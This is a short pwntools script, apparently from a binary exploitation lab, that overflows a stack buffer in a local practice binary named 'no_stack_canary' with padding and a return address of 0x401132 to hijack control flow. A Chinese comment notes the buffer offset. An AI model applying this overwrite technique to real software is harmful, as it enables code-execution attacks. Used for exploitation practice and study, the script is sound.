from pwn import *

p = process('../target/no_stack_canary')
# 这次按查看到s变量偏移0xc 加 8bytecanary值
payload = b'A'*(0xc+8) + p64(0x401132)
p.sendline(payload)
print(p.recv())